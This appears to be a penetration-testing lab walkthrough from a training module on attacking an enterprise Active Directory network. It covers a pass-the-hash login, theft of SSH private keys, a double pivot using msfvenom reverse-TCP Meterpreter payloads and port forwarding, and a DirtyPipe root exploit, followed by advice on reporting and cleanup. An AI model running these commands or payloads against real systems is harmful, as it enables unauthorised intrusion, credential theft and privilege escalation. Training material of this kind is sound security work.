        As discussed in the Active Directory Enumeration & Attacks module, we can provide extra value to our clients by digging deeper into Active Directory and finding best practice recommendations and delivering them in the appendices of our report. The tool PingCastle is excellent for auditing the overall security posture of the domain and we can pull many different items from the report it generates to give our client recommendations on additional ways they can harden their AD environment. This type of "above and beyond the call of duty" work can build good will with our customers and lead to both repeat business and referrals. Its a great way to set ourselves apart and demonstrate the risks that plague AD environments and show our deep understanding of the client's network.



        -Hunting for Sensitive Data/Hosts

        Once we've gained access to the Domain Controller we can likely access most any resources in the domain. If we want to demonstrate impact for our clients a good spot to start is going back to the file shares to see what other types of data we can now view. As discussed in the Documentation & Reporting module, we should make sure to just take screenshots showing a file listing if we find a particularly sensitive file share, and not open individual files and take screenshots or remove any files from the network.


        $ proxychains evil-winrm -i 172.16.8.3 -u administrator -H fd1f7e556xxxxxxxxxxxddbb6e6afa2


        Let's go back to the Department Shares share and see what else we can find.

        Depending on the client industry and business, there are various things we can go after to demonstrate impact. HR data such as salaries and bonuses should be well-protected, R&D information could potentially hurt a company if it is leaked so they should have extra controls in place. It can be a good practice to not allow Domain Admins to have blanket access to all data, because if one account is compromised then everything will be. Some companies will have a separate site or non-domain joined file share or backup server to house sensitive data. In our case Inlanefreight has asked us to test if we can gain access to any hosts in the 172.16.9.0/23 subnet. This is their management network and houses sensitive servers that should be not directly accessible from hosts in the principal domain and gaining Domain Admin rights should not lead to immediate access.

        Within the private IT share we can see two subdirectories: Development and Networking. The Development subdirectory houses the backup script that we obtained earlier. Let's take a look in the Networking subdirectory.

        We can see SSH private keys for three different users. This is interesting.

        Can any of these users be leveraged to access a host in the protected network?

        Looking at the network adapters on the Domain Controllers we can see that it has a second NIC in the 172.16.9.0 network.


        Typing arp -a to view the arp table does not yield anything interesting. We can use PowerShell to perform a ping sweep and attempt to identify live hosts.


        *Evil-WinRM* PS C:\Department Shares\IT\Private\Networking>  1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}

        We can see one live host, 172.16.9.25, that perhaps one of the SSH private keys will work against. Let's get to work. First download the SSH keys via our evil-winrm connection to the Domain Controller.

        Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" /tmp/ssmallsadm-id_rsa 




                        //The Double Pivot - MGMT01

        
        Now there are a few ways to do this next part, we'll take the long route so we can ultimately SSH directly into the 172.16.9.25 host from our attack box, performing a bit of a mindbending double pivot in the process. Here is what we are trying to achieve, starting from our attack host and pivoting through the dmz01 and DC01 hosts to be able to SSH directly into the MGMT01 host two hops away directly from our attack host.

                Attack host --> dmz01 --> DC01 --> MGMT01


        We'll need to establish a reverse shell from the dmz01 box back to our attack host. We can do this the same we way did in the Internal Information Gathering section, creating an ELF payload, uploading it to the target and executing it to catch a shell. Start by creating the ELF payload and uploading it back to the dmz01 host via SCP if you removed it.

        Catch the Meterpreter shell using the multi/handler.

        Next, set up a local port forwarding rule to forward all traffic destined to port 1234 on dmz01 to port 8443 on our attack host.

        (Meterpreter 1)(/root) > portfwd add -R -l 8443 -p 1234 -L 10.10.14.15

        Next, create an executable payload that we'll upload to the Domain Controller host.

        $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234

        Upload the payload to the DC.

        *Evil-WinRM* PS C:\> upload "/home/tester/dc_shell.exe" 

        Start another multi/handler in the same msfconsole session to catch the shell from the DC.

        
        
        [msf](Jobs:0 Agents:1) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
        payload => windows/x64/meterpreter/reverse_tcp
        [msf](Jobs:0 Agents:1) exploit(multi/handler) >> set lhost 0.0.0.0
        lhost => 0.0.0.0
        [msf](Jobs:0 Agents:1) exploit(multi/handler) >> set lport 8443
        lport => 8443
        [msf](Jobs:0 Agents:1) exploit(multi/handler) >> exploit

        Execute the payload on the DC and, if all goes to plan, we'll catch it in our handler.

        *Evil-WinRM* PS C:\Users\Administrator\Documents> .\dc_shell.exe

        For our next trick we'll set up a route to the 172.16.9.0/23 subnet.


        (Meterpreter 2)(C:\) > run autoroute -s 172.16.9.0/23  ( DC01 )

        Now we need to set up a socks proxy which is the final step before we can communicate directly with the 172.16.9.0/23 network from our attack host.

        Now we can test this out by running Nmap against the target, and we confirm that we are able to scan it.

        Gkaranikas@htb[/htb]$ proxychains nmap -sT -p 22 172.16.9.25


        Gkaranikas@htb[/htb]$ proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25




        -Privilege escallation

        As a final step we'll enumerate the target system, checking for local privilege escalation opportunities. If we can get root-level access we'll have fulfilled the client's main goal, as they stated that this server holds their "crown jewels", or most important data. During our enumeration we do a Google search based off of the Kernel version and see that it's likely vulnerable to the DirtyPipe, CVE-2022-0847. 


        ssmallsadm@MGMT01:~$ uname -a

        Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux


        We'll use exploit-2 from this GitHub repo  (   https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits ). Since we have SSH access to the system, we can create a file with Vim and paste the exploit code in. We then must compile it, and luckily gcc is present on the system.

        We must run the exploit against a SUID binary to inject and overwrite memory in a root process. So first we need to search SUID binaries on the system.

        ssmallsadm@MGMT01:~$ find / -perm -4000 2>/dev/null

        Finally, we'll run the exploit against the /usr/lib/openssh/ssh-keysign SUID binary and drop into a root shell.

        ssmallsadm@MGMT01:~$ ./dirtypipe /usr/lib/openssh/ssh-keysign




        -Data Exfiltration Simulation


        Some clients may want to test their Data Loss Prevention (DLP) capabilities, so we could experiment with various ways to exfiltrate mock data from their network to see if we are detected. We should work with the client to understand what types of data they are trying to protect and proceed accordingly. It's best to use mock data so we don't have to deal with any highly sensitive client data on our testing system.



        -Attacking Domain Trusts


        If there are any domain trusts we could use our skills to enumerate these relationships and exploit either a child --> parent trust relationship, intra-forest trust, or an external forest trust. Before doing so, we should check with the client to make sure the target domain is in scope for testing. Sometimes we'll compromise a less import domain and be able to use this access to fully take over the principal domain. This can provide a lot of value to the client as they may have set up trust relationships hastily as the result of a merger & acquisition or connecting to some other organization. Their domain may be well-hardened, but what if we are able to Kerberoast across a forest trust, compromise a partner forest, and then find an account in the partner forest that has full admin rights in our current domain. In this situation we could demonstrate to our client that the main weakness isn't in the domain we are testing in but another so they can proceed accordingly.







                        //Structuring our Findings

        Ideally, we have noted down findings as we test, including as many command outputs and evidence in our notetaking tool as possible. This should be done in a structured way, so it's easy to drop into the report. If we haven't been doing this, we should ensure we have a prioritized finding list and all necessary command output and screenshots before we lose access to the internal network or cease any external testing. We don't want to be in the position of asking the client to grant us access again to gather some evidence or run additional scans. We should have been structuring our findings list from highest to lowest risk as we test because this list can be beneficial to send to the client at the end of testing and is very helpful when drafting our report.

        For more on notetaking and reporting, see the Documentation & Reporting module. It's worth following the tips in that module for setting up your testing and notetaking environment and approaching the network in this module (Attacking Enterprise Networks) as a real-world penetration test, documenting and logging everything we do along the way. It's also great practice to use the sample report from the Documentation & Reporting module and create a report based on this network. This network has many opportunities to practice all aspects of report documentation and report writing.




                        //Post-Engagement Cleanup

        If this were a real engagement, we should be noting down:

        Every scan
        Attack attempt
        File placed on a system
        Changes made (accounts created, minor configuration changes, etc.)

        Before the engagement closes, we should delete any files we uploaded (tools, shells, payloads, notes) and restore everything to the way we found it. Regardless of if we were able to clean everything up, we should still note down in our report appendices every change, file uploaded, account compromise, and host compromise, along with the methods used. We should also retain our logs and a detailed activity log for a period after the assessment ends in case the client needs to correlate any of our testing activities with some alerts. Treat the network in this module like a real-world customer network. Go back through a second time and pentest it as if it were an actual production network, taking minimally invasive actions, noting down all actions that may require cleanup, and clean up after yourself at the end! This is a great habit to develop.


        